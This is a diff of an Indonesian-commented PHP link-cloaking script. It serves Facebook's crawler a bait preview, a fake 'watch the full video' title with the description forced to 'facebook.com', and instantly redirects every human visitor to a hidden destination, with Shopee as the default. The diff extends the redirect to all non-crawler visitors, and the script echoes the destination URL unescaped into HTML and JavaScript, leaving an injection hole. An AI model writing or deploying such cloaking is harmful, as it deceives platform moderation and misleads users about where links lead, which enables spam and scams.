@@ -4,7 +4,7 @@ $id = $_GET['id'] ?? '';
 // Default Fallback jika data kosong
 $destination = 'https://shopee.co.id';
 $title       = 'Lihat Video Selengkapnya';
-$description = 'Facebook.com';
+$description = 'facebook.com';
 $image       = '';
 
 // Ambil data dari JSON
@@ -13,22 +13,21 @@ if (!empty($id) && file_exists('database.json')) {
     if (isset($dbData[$id])) {
         $destination = $dbData[$id]['dest'];
         $title       = $dbData[$id]['title'];
-        $description = $dbData[$id]['desc'];
         $image       = $dbData[$id]['img'];
+        // Deskripsi dipaksa menjadi facebook.com sesuai permintaan Anda
+        $description = 'facebook.com';
     }
 }
 
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
-// 1. DETEKSI BOT RESMI FACEBOOK (Crawler/Scraper)
-// Cek apakah yang datang adalah bot pemeriksa tautan milik Facebook
+// Deteksi Bot Facebook Crawler
 $isFacebookBot = (strpos($userAgent, 'facebookexternalhit') !== false || strpos($userAgent, 'Facebot') !== false);
 
-// 2. DETEKSI KLIK ASLI MANUSIA DI DALAM APLIKASI FB
-$isInAppFacebook = (strpos($userAgent, 'FBAN') !== false || strpos($userAgent, 'FBAV') !== false || strpos($userAgent, 'FB_IAB') !== false);
-
-if ($isInAppFacebook) {
-    // --- JIKA MANUSIA ASLI (Klik dari dalam aplikasi FB): LANGSUNG LEMPAR KE SHOPEE ---
+// Jika BUKAN Bot Facebook (Artinya ini Klik Manusia Asli dari FB maupun Browser Lain)
+if (!$isFacebookBot) {
+    // Pengalihan instan menggunakan Meta Refresh murni untuk menghindari popup "Keluar dari Aplikasi"
+    header("Link: <$destination>; rel=\"prefetch\"");
     ?>
     <!DOCTYPE html>
     <html>
@@ -37,17 +36,19 @@ if ($isInAppFacebook) {
         <meta name="referrer" content="no-referrer">
         <meta http-equiv="refresh" content="0;url=<?php echo $destination; ?>">
         <script type="text/javascript">
-            window.location.replace("<?php echo $destination; ?>");
+            // Backup jika Meta Refresh lambat bekerja di device tertentu
+            window.location.href = "<?php echo $destination; ?>";
         </script>
     </head>
     <body>
-        <p>Menuju halaman produk...</p>
+        <p>Mengalihkan secara aman...</p>
     </body>
     </html>
     <?php
     exit;
 } else {
-    // --- JIKA BUKAN DARI IN-APP FB (Bisa jadi Bot Crawler FB, atau User dari Chrome/Safari) ---
+    // Jika yang mengakses adalah BOT FACEBOOK (Saat status baru ditempel atau di-scand)
+    // Tampilkan Meta Tag dengan Gambar Besar tanpa script pengalihan sama sekali
     ?>
     <!DOCTYPE html>
     <html lang="id">
@@ -55,27 +56,22 @@ if ($isInAppFacebook) {
         <meta charset="UTF-8">
         <title><?php echo htmlspecialchars($title); ?></title>
         
-        <meta property="og:type" content="website" />
+        <meta property="og:type" content="article" />
         <meta property="og:title" content="<?php echo htmlspecialchars($title); ?>" />
         <meta property="og:description" content="<?php echo htmlspecialchars($description); ?>" />
         <meta property="og:image" content="<?php echo htmlspecialchars($image); ?>" />
         <meta property="og:image:secure_url" content="<?php echo htmlspecialchars($image); ?>" />
         <meta property="og:image:width" content="1200" />
         <meta property="og:image:height" content="630" />
+        <meta property="og:image:type" content="image/jpeg" />
         
-        <?php if (!$isFacebookBot): ?>
-        <meta http-equiv="refresh" content="1;url=<?php echo $destination; ?>">
-        <script type="text/javascript">
-            setTimeout(function(){
-                window.location.replace("<?php echo $destination; ?>");
-            }, 1000);
-        </script>
-        <?php endif; ?>
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="<?php echo htmlspecialchars($title); ?>">
+        <meta name="twitter:description" content="<?php echo htmlspecialchars($description); ?>">
+        <meta name="twitter:image" content="<?php echo htmlspecialchars($image); ?>">
     </head>
-    <body style="background:#f0f2f5; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
-        <div style="text-align:center;">
-            <p>Memuat Konten...</p>
-        </div>
+    <body>
+        <p>Facebook Crawler Mode.</p>
     </body>
     </html>
     <?php
